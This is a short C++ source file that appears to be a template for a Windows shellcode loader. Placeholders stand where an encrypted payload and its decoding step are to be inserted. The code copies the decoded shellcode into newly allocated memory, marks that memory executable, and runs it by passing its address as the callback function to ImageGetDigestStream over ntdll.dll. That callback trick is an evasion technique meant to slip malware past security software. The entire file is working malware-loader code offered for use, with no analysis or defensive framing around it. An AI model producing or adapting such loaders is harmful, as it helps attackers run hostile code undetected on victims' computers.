#include <windows.h>
#include <stdio.h>
#include <imagehlp.h>
#include "base64.h"
#include "syscall.h"


#pragma comment(lib, "Imagehlp.lib")


char Ciphertext[] = "<Ciphertext>";

int main() {

	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	::RtlMoveMemory(addr, shellcode, sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	HANDLE hImg = ::CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE dummy;

	if (hImg) {

		::ImageGetDigestStream(hImg, CERT_PE_IMAGE_DIGEST_ALL_IMPORT_INFO, (DIGEST_FUNCTION)addr, &dummy);
		::CloseHandle(dummy);

	}

	::CloseHandle(hImg);

}